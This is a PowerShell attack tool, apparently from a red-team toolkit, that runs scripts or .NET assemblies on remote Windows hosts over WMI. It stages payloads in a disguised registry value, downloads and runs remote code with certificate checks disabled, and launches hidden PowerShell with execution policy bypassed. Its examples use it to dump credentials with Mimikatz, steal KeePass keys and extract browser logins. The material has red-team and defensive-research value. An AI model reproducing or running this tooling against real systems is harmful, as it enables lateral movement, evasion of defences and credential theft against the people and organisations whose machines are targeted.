function Invoke-PowerExec {
<#
.SYNOPSIS
    Run a payload on remote hosts and get the output.

    Author: Timothée MENOCHET (@synetis)

.DESCRIPTION
    Invoke-PowerExec runs PowerShell scripts and .NET assemblies on remote hosts over WMI, and returns the output.

.NOTES
    Invoke-PowerExec does NOT require PowerShell Remoting or WinRM to work and only uses Windows Management Instrumentation (WMI).

.PARAMETER Type
    Specify the payload type (PSScript, NETAssembly).

.PARAMETER File
    Specify a local paylaod to run.

.PARAMETER URL
    Specify a remote paylaod to run.

.PARAMETER Arguments
    Specify the payload arguments.

.PARAMETER Hosts
    Specify the target hosts.

.PARAMETER Credential
    Specify the privileged account to use.

.EXAMPLE
    PS C:\> . .\Invoke-PowerExec.ps1
    PS C:\> Invoke-PowerExec -Type PSScript -File .\Invoke-Mimikatz.ps1 -Arguments 'Invoke-Mimikatz -DumpCreds' -Hosts '192.168.0.1'

.EXAMPLE
    PS C:\> Invoke-PowerExec -Type PSScript -URL 'http://192.168.0.10/KeeTheft.ps1' -Arguments 'Get-KeePassDatabaseKey' -Hosts '192.168.0.1','192.168.0.2' -Credential ADATUM\Administrator

.EXAMPLE
    PS C:\> Invoke-PowerExec -Type NETAssembly -File .\SharpChrome.exe -Arguments 'logins','/unprotect','/format:table' -Hosts $(gc hosts.txt) -Credential ADATUM\Administrator
#>

	Param (
		[Parameter(Mandatory=$True)]
		[ValidateSet("PSScript","NETAssembly")]
		[String]$Type,

		[ValidateNotNullOrEmpty()]
		[String]
		$File = $null,

		[ValidateNotNullOrEmpty()]
		[String]
		$URL = $null,

		[ValidateNotNullOrEmpty()]
		[String[]]
		$Arguments = $null,

		[Parameter(ValueFromPipeline=$True)]
		[ValidateNotNullOrEmpty()]
		[String[]]
		$Hosts = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty
	)

	ForEach($ComputerName in $Hosts) {
		If ($File) {
			# Upload the payload
			$bytes = [IO.File]::ReadAllBytes((Resolve-Path $File))
			$RegValue = [System.Convert]::ToBase64String($bytes)
			$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
			$RegHive = 2147483650
			$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
			$RegKey = 'RunMe'
			Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name SetStringValue $RegHive, $RegPath, $RegValue, $RegKey -ComputerName $ComputerName -Credential $Credential | Out-Null			
			# Retrieve the payload and run it
			$Script = '$EncCode = (Get-ItemProperty -Path "' + $RegistryPath + '").' + "$RegKey" + '; $Code = [System.Convert]::FromBase64String($EncCode); '
			If($Type -eq 'PSScript') {
				$Script = $Script + '[System.Text.Encoding]::UTF8.GetString($Code) | Invoke-Expression; ' + "$Arguments"
			} ElseIf($Type -like 'NETAssembly') {
				$Arguments = ($Arguments -join '","')
				$Script = $Script + '$Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = "' + $Arguments + '"; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
			}
			Invoke-WMIExec -Command $Script -ComputerName $ComputerName -Credential $Credential
			Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
		} ElseIf ($URL) {
			# Download the payload and run it
			$Script = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object Net.WebClient; $client.Proxy = [Net.WebRequest]::GetSystemWebProxy(); $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials; '
			If($Type -eq 'PSScript') {
				$Script = $Script + '$Code = $client.DownloadString("' + $URL + '"); $Code | Invoke-Expression; ' + "$Arguments"
			} ElseIf($Type -like 'NETAssembly') {
				$Arguments = ($Arguments -join '","')
				$Script = $Script + '$Code = $client.DownloadData("' + $URL + '"); $Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = "' + $Arguments + '"; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
			}
			Invoke-WMIExec -Command $Script -ComputerName $ComputerName -Credential $Credential
		} Else {
			Write-Error 'File or URL argument missing'
		}
	}
}

function Invoke-WMIExec {

	Param (
		[ValidateNotNullOrEmpty()]
		[String]
		$Command = 'hostname',

		[ValidateNotNullOrEmpty()]
		[String]
		$ComputerName = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty
	)

	Write-Host "`n[*] Host: $ComputerName"

	# Run the command and store the output
	$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
	$RegHive = 2147483650
	$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
	$RegKey = 'ReadMe'
	$EncScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
	$Command = "powershell -Version 2 -Enc $EncScript"
	$Script = '$Output = ' + "$Command" + ' | Out-String; $EncOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Output)); New-ItemProperty -Path ' + "'$RegistryPath'" + ' -Name ' + "'$RegKey'" + ' -Value $EncOutput -PropertyType String -Force;'
	$Command = 'powershell.exe -W Hidden -NonI -NoP -Exec Bypass -Command ' + "$Script"
	$Process = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command -ComputerName $ComputerName -Credential $Credential
	$ProcessId = $Process.ProcessId
	Do {
		Start-Sleep -m 1000
	} Until ((Get-WMIobject -Class Win32_process -Filter "ProcessId='$ProcessId'" -ComputerName $ComputerName -Credential $Credential | Where {$_.Name -eq "powershell.exe"}).ProcessID -eq $null)

	# Retrieve the command output
	$EncOutput = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential
	$Output = [System.Convert]::FromBase64String($EncOutput.sValue)
	$Output = [System.Text.Encoding]::Unicode.GetString($Output)
	Write-Host $Output
	Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
}